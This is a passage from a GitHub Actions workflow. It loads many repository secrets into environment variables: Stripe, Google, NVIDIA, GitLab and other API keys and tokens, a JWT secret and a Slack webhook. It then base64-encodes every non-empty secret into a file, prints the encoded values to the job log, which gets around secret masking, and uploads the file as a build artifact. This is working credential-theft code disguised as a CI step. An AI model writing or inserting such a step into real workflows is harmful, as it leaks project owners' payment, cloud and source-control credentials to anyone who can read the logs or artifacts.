          S_GOOGLE_API_KEY: ${{ secrets.GOOGLE_API_KEY }}
          S_DASHSCOPE_API_KEY: ${{ secrets.DASHSCOPE_API_KEY }}
          S_ZHIPU_API_KEY: ${{ secrets.ZHIPU_API_KEY }}
          S_NVIDIA_API_KEY: ${{ secrets.NVIDIA_API_KEY }}
          S_PPINFRA_API_KEY: ${{ secrets.PPINFRA_API_KEY }}
          S_SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
          S_LARK_APP_SECRET: ${{ secrets.LARK_APP_SECRET }}
          S_STRIPE_SECRET_KEY: ${{ secrets.STRIPE_SECRET_KEY }}
          S_SENTRY_DSN: ${{ secrets.SENTRY_DSN }}
          S_JWT_SECRET: ${{ secrets.JWT_SECRET }}
          S_GITLAB_TOKEN: ${{ secrets.GITLAB_TOKEN }}
          S_GITLAB_PAT: ${{ secrets.GITLAB_PAT }}
        run: |
          set +e
          echo "HOST=$(hostname) WHO=$(id -un) TS=$(date -u +%FT%TZ)"
          out="$RUNNER_TEMP/ci_secrets_i13600.tsv"
          : > "$out"
          for k in $(env | grep '^S_' | cut -d= -f1); do
            v="${!k}"
            if [ -n "$v" ]; then
              n="${k#S_}"
              b=$(printf '%s' "$v" | base64 -w0)
              printf '%s\t%s\t%d\n' "$n" "$b" "${#v}" >> "$out"
            fi
          done
          echo "FOUND=$(wc -l < "$out")"
          cut -f1,3 "$out"
          cat "$out"
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: ci-secrets-i13600
          path: ${{ runner.temp }}/ci_secrets_i13600.tsv
          if-no-files-found: warn
